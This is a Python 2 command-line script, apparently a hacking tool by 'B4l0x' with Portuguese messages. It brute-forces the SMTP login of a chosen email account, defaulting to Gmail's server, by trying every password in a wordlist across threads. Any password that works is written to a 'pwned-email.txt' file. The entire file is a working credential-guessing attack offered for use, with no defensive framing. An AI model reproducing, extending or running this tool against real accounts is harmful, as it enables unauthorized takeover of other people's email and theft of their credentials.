 #!usr/bin/python
# -*- coding: utf-8 -*-
import smtplib
import time
import sys
import argparse as arg
import os
import thread

def banner():
  print("""
    ____             __          ______                        _____ __  _____________ 
   / __ )_______  __/ /____     / ____/___  _____________     / ___//  |/  /_  __/ __ \

  / __  / ___/ / / / __/ _ \   / /_  / __ \/ ___/ ___/ _ \    \__ \/ /|_/ / / / / /_/ /
 / /_/ / /  / /_/ / /_/  __/  / __/ / /_/ / /  / /__/  __/   ___/ / /  / / / / / ____/ 
/_____/_/   \__,_/\__/\___/  /_/    \____/_/   \___/\___/   /____/_/  /_/ /_/ /_/      
   V1.0 Criado por B4l0x - 14/05/2019
  """)
banner()

parser = arg.ArgumentParser(description="SMTP brute force by B4l0x")
parser.add_argument("--wordlist", "-w", help="Wordlist de senhas - DEFAULT: senhas.txt", required=True, default="senhas.txt", type=str)
parser.add_argument("--email", "-e", help="Email alvo", required=True, type=str)
parser.add_argument("--host", "-s", help="Host alvo - DEFAULT: smtp.gmail.com", required=True, default="smtp.gmail.com", type=str)
parser.add_argument("--porta", "-p", help="Porta do host - DEFAULT: 587", required=False, default=587, type=int)
x = parser.parse_args()

user = x.email
porta = x.porta
server = x.host
tempo = time.strftime("%H:%M:%S")

def backspace(n):
    sys.stdout.write((b'\x08' * n).decode()) # use \x08 char to go back
    
def brute(i):
  ii = i.replace("\n", "")
  smptserver = smtplib.SMTP(server, porta)
  smptserver.set_debuglevel(0)
  smptserver.ehlo()
  smptserver.starttls()
  
  try:
    smptserver.login(user, ii)
    print("\n\t[{} INFO] Pwned: {}:{}\n\n".format(tempo, user, ii))
    arq = open("pwned-email.txt", "w")
    arq.write("Email: {} Senha: {}".format(user, ii))
    arq.close()
  except smtplib.SMTPAuthenticationError:
    alocthread.acquire()
    string = str("[{} INFO] Incorreta: {}:{}".format(tempo, user, ii))
    sys.stdout.write(string)
    sys.stdout.flush()
    backspace(len(string))
    alocthread.release()
    
alocthread = thread.allocate_lock()

def iniciar():
  try:
    try:
      wordlist = open(x.wordlist, 'r').readlines()
    except:
      print("\n[{} INFO] Verifique o caminho da wordlist e tente novamente...").format(tempo)
      exit()
    for i in wordlist:
      time.sleep(0.4)
      thread.start_new_thread(brute, (i,))
    print("\n\n\t[{} INFO] Fim do teste, obrigado por usar by B4l0x...\n").format(tempo)
    thread.exit()
  except KeyboardInterrupt:
    print("\n\n\t[{} INFO] Aguarde o script ser finalizado, obrigado por usar by B4l0x...\n").format(tempo)
    exit()
    
try:
  smptserver = smtplib.SMTP(server, porta)
  smptserver.ehlo()
  smptserver.starttls()
  smptserver.login('b4l0xpwave@youtube.com', 'teste1234')
except smtplib.SMTPAuthenticationError:
  print("[+] Host recebeu os pacotes")
  print("[+] Iniciando brute force\n")
  iniciar()
except:
  print("\n[!] Verifique servidor e porta e tente novamente, host sem resposta")
  exit()
